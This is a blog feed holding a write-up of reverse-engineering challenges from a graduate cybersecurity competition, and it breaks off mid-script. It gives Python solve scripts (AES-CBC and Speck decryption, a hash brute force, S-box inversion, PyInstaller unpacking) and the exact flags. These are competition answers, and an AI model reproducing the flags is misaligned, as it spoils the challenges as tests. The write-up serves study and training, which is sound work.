<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Matriy&#39;s blog</title>
  
  
  <link href="http://matriy330.github.io/atom.xml" rel="self"/>
  
  <link href="http://matriy330.github.io/"/>
  <updated>2025-11-06T00:25:55.142Z</updated>
  <id>http://matriy330.github.io/</id>
  
  <author>
    <name>Matriy</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>华为杯第四届中国研究生网络安全创新大赛 Megrez RE WP</title>
    <link href="http://matriy330.github.io/9e076382/"/>
    <id>http://matriy330.github.io/9e076382/</id>
    <published>2025-11-07T00:25:25.000Z</published>
    <updated>2025-11-06T00:25:55.142Z</updated>
    
    <content type="html"><![CDATA[<h1 id="“华为杯”第四届中国研究生网络安全创新大赛-Megrez-RE-WP"><a href="#“华为杯”第四届中国研究生网络安全创新大赛-Megrez-RE-WP" class="headerlink" title="“华为杯”第四届中国研究生网络安全创新大赛 Megrez RE WP"></a>“华为杯”第四届中国研究生网络安全创新大赛 Megrez RE WP</h1><p>本次研究生赛我们排名第6，解出8题<br>成功晋级<br>这是与我相关的一些题目</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301040044.png" alt="image-20251030104027894"></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="YJS-GoEnc"><a href="#YJS-GoEnc" class="headerlink" title="YJS-GoEnc"></a>YJS-GoEnc</h2><p>IDA 打开，直接转到main函数看逻辑</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044817.png" title=" =773x309"></p><p>main_main中的逻辑校验</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044818.png" title=" =1542x903"></p><p>如图，并且选择前16位作为key</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044819.png" title=" =1950x1116"></p><p>main_encryptWithAES看出来为AES加密,并且为CBC模式</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044820.png" title=" =1272x1413"></p><p>最后进行Base64编码</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044821.png" title=" =1584x411"></p><p>密文为base64的串交叉引用即可找到</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044822.png" title=" =1632x1446"></p><p>key在这里做了变换</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044823.png" title=" =1125x912"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">KEY_SOURCE = <span class="built_in">bytearray</span>(<span class="string">b&quot;MySecretKey123451234567890abcdef/proc/self/auxv&quot;</span>)</span><br><span class="line">STATE_BYTES = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0xAA</span>, <span class="number">0xBB</span>, <span class="number">0xCC</span>, <span class="number">0xDD</span>, <span class="number">0xEE</span>, <span class="number">0xFF</span>, <span class="number">0x11</span>, <span class="number">0x22</span>,</span><br><span class="line">    <span class="number">0x33</span>, <span class="number">0x44</span>, <span class="number">0x55</span>, <span class="number">0x66</span>, <span class="number">0x77</span>, <span class="number">0x88</span>, <span class="number">0x99</span>, <span class="number">0x00</span>,</span><br><span class="line">])</span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line">ROUNDS = <span class="number">6</span></span><br><span class="line">CIPHERTEXT_B64 = <span class="string">&quot;JBaoWyDrnxq47qscXupR5W+zxqUHT/Z0h9Qjh97aSuM09nZH7AauwGLHhDE1KKdj&quot;</span></span><br><span class="line">IV_BYTES = <span class="string">b&quot;1234567890abcdef&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl</span>(<span class="params">byte: <span class="built_in">int</span>, count: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    byte &amp;= <span class="number">0xFF</span></span><br><span class="line">    <span class="keyword">return</span> ((byte &lt;&lt; count) | (byte &gt;&gt; (<span class="number">8</span> - count))) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scramble_key</span>(<span class="params">seed: <span class="built_in">bytearray</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    key = <span class="built_in">bytearray</span>(seed)</span><br><span class="line">    iteration = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        step = (<span class="number">23</span> * iteration + <span class="number">0x4D</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(BLOCK_SIZE):</span><br><span class="line">            val = key[idx] ^ step</span><br><span class="line">            val = rotl(val, <span class="number">2</span>)</span><br><span class="line">            val ^= STATE_BYTES[idx % <span class="built_in">len</span>(STATE_BYTES)]</span><br><span class="line">            val = (val + iteration + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">            key[idx] = val</span><br><span class="line">        iteration += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(key[:BLOCK_SIZE])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">data: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    pad_len = data[-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">1</span> &lt;= pad_len &lt;= BLOCK_SIZE <span class="keyword">or</span> data[-pad_len:] != <span class="built_in">bytes</span>([pad_len]) * pad_len:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;invalid PKCS#7 padding&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> data[:-pad_len]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = scramble_key(KEY_SOURCE)</span><br><span class="line">    cipher = base64.b64decode(CIPHERTEXT_B64)</span><br><span class="line">    plaintext = AES.new(key, AES.MODE_CBC, IV_BYTES).decrypt(cipher)</span><br><span class="line">    flag = unpad(plaintext).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>flag{ca083c88-30b7-447c-8e6a-e7470862abe7}</p><h2 id="YJS-bc"><a href="#YJS-bc" class="headerlink" title="YJS-bc"></a>YJS-bc</h2><p>直接用llvm-dis bc.bc output.ll去反编译得到一个文件去分析</p><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044824.png" title=" =1086x738"></p><p>逆向这个这个代码拿flag</p><p>程序用 strtok(“_”) 将整行拆成三段：第一段长度要正好 5、且都是 [0-9a-f]；第二段用于 Speck-128&#x2F;128；第三段逐字节进 AES S- box，对比常量 1a04434de3099a51c79f8500 的前 11 字节（末字节是填零）。</p><p>第一段：暴力 SHA-256 第一段的 SHA256(part1) 必须等于常量 eb3404…2fcb。写脚本枚举所有 5 位十六进制串即可。 b1a37</p><p>第二段：还原 Speck 明文 密钥由第一段拼上其 SHA 摘要前 11 字节组成 16 字节（小端两段，先扩展 32 轮 round key）。程序随后把输入第二段当作 16 字节 块，用相同流程加密后要匹配常量密文 502a7c…f5b9。依 Speck-128&#x2F;128 逆向解密该密文得到明文 3peckenc0def1n@l。</p><p>第三段：逆 S-box 常量数组是标准 AES S-box 的表。运行时把第三段每个字节过 S-box 并与常量前 11 个字节比较；数组末尾 0x00 仅是填充。把常量前 11 字节通过逆 S-box 即得第三段 C0deM@7p1ng。</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">TARGET_HASH = <span class="built_in">bytes</span>.fromhex(</span><br><span class="line">    <span class="string">&quot;eb34049ced1f583016dc8952c68aaa0b0fb1ed3920b6dc4089eaaf56b8402fcb&quot;</span></span><br><span class="line">)</span><br><span class="line">TARGET_CIPHER = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;502a7cc6bc967a36304e189a192df5b9&quot;</span>)</span><br><span class="line">SBOX = <span class="built_in">bytes</span>([</span><br><span class="line">    <span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line">    <span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line">    <span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line">    <span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line">    <span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line">    <span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line">    <span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line">    <span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line">    <span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line">    <span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line">    <span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line">    <span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line">    <span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line">    <span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line">    <span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line">    <span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>,</span><br><span class="line">])</span><br><span class="line">TARGET_SUB = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1a04434de3099a51c79f8500&quot;</span>)</span><br><span class="line">MASK64 = (<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ror64</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">63</span></span><br><span class="line">    <span class="keyword">return</span> ((x &gt;&gt; r) | (x &lt;&lt; (<span class="number">64</span> - r))) &amp; MASK64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol64</span>(<span class="params">x, r</span>):</span><br><span class="line">    r &amp;= <span class="number">63</span></span><br><span class="line">    <span class="keyword">return</span> ((x &lt;&lt; r) | (x &gt;&gt; (<span class="number">64</span> - r))) &amp; MASK64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expand_round_keys</span>(<span class="params">a0, b0</span>):</span><br><span class="line">    a, b = a0, b0</span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        keys.append(a)</span><br><span class="line">        b = ror64(b, <span class="number">8</span>)</span><br><span class="line">        b = (b + a) &amp; MASK64</span><br><span class="line">        b ^= i</span><br><span class="line">        a = rol64(a, <span class="number">3</span>)</span><br><span class="line">        a ^= b</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_block</span>(<span class="params">block, keys</span>):</span><br><span class="line">    x, y = block</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">reversed</span>(keys):</span><br><span class="line">        x ^= y</span><br><span class="line">        x = ror64(x, <span class="number">3</span>)</span><br><span class="line">        y ^= k</span><br><span class="line">        y = (y - x) &amp; MASK64</span><br><span class="line">        y = rol64(y, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> x, y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_first_token</span>():</span><br><span class="line">    alphabet = <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">    <span class="keyword">for</span> cand <span class="keyword">in</span> <span class="built_in">map</span>(<span class="string">&quot;&quot;</span>.join, itertools.product(alphabet, repeat=<span class="number">5</span>)):</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(cand.encode()).digest() == TARGET_HASH:</span><br><span class="line">            <span class="keyword">return</span> cand</span><br><span class="line">    <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no candidate found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_sbox_sequence</span>(<span class="params">sequence</span>):</span><br><span class="line">    inv = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">    <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">enumerate</span>(SBOX):</span><br><span class="line">        inv[val] = idx</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(inv[b] <span class="keyword">for</span> b <span class="keyword">in</span> sequence)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    part1 = find_first_token()</span><br><span class="line">    digest = hashlib.sha256(part1.encode()).digest()</span><br><span class="line">    key_material = part1.encode() + digest[:<span class="number">11</span>]</span><br><span class="line">    k0, k1 = struct.unpack(<span class="string">&quot;&lt;QQ&quot;</span>, key_material)</span><br><span class="line">    round_keys = expand_round_keys(k0, k1)</span><br><span class="line">    cipher_block = struct.unpack(<span class="string">&quot;&lt;QQ&quot;</span>, TARGET_CIPHER)</span><br><span class="line">    plain_block = decrypt_block(cipher_block, round_keys)</span><br><span class="line">    part2 = struct.pack(<span class="string">&quot;&lt;QQ&quot;</span>, *plain_block)</span><br><span class="line">    part3 = invert_sbox_sequence(TARGET_SUB)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part1:&quot;</span>, part1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part2:&quot;</span>, part2.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;part3:&quot;</span>, part3.decode())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nSubmit:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;part1&#125;</span>_<span class="subst">&#123;part2.decode()&#125;</span>_<span class="subst">&#123;part3.decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p> <img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510302044825.png" title=" =533x135"></p><p>我解出来是flag{b1a37_3peckenc0def1n@l_C0deM@7p1ngR}，提交错误</p><p>平台放了hint是41位长度，把最后一个R去掉即可</p><p>flag{b1a37_3peckenc0def1n@l_C0deM@7p1ng}</p><h2 id="YJS-ooops-三种解法"><a href="#YJS-ooops-三种解法" class="headerlink" title="YJS-ooops 三种解法"></a>YJS-ooops 三种解法</h2><p>魔改了Magic,修一下那个py解包脚本即可解包、</p><p>改成</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MAGIC = b&#x27;swI\014\013\012\013\016&#x27;  # Magic number which identifies pyinstaller</span><br></pre></td></tr></table></figure><blockquote><p>你问我怎么发现魔改的?附件直接丢给AI它能扫出来</p></blockquote><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202510301041727.png" alt="image-20251030104143587"></p><p>这个opcode.pyc反编译失败，应该是做了些处理，我们尝试看一下它的字节码的反汇编代码</p><p>直接dis也会出现问题</p><p>用这个代码去解析</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># analyze_ooops.py</span></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> types</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_code</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> marshal.loads(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_code_obj</span>(<span class="params">root_co, target_name</span>):</span><br><span class="line">    <span class="keyword">for</span> const <span class="keyword">in</span> root_co.co_consts:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(const, types.CodeType):</span><br><span class="line">            <span class="keyword">if</span> const.co_name == target_name:</span><br><span class="line">                <span class="keyword">return</span> const</span><br><span class="line">            sub = find_code_obj(const, target_name)</span><br><span class="line">            <span class="keyword">if</span> sub:</span><br><span class="line">                <span class="keyword">return</span> sub</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_func_from_code</span>(<span class="params">code_obj</span>):</span><br><span class="line">    glb = &#123;</span><br><span class="line">        <span class="string">&quot;__builtins__&quot;</span>: __builtins__,</span><br><span class="line">        <span class="string">&quot;struct&quot;</span>: <span class="built_in">__import__</span>(<span class="string">&quot;struct&quot;</span>),</span><br><span class="line">        <span class="string">&quot;zlib&quot;</span>: <span class="built_in">__import__</span>(<span class="string">&quot;zlib&quot;</span>),</span><br><span class="line">        <span class="string">&quot;bytearray&quot;</span>: <span class="built_in">bytearray</span>,</span><br><span class="line">        <span class="string">&quot;bytes&quot;</span>: <span class="built_in">bytes</span>,</span><br><span class="line">        <span 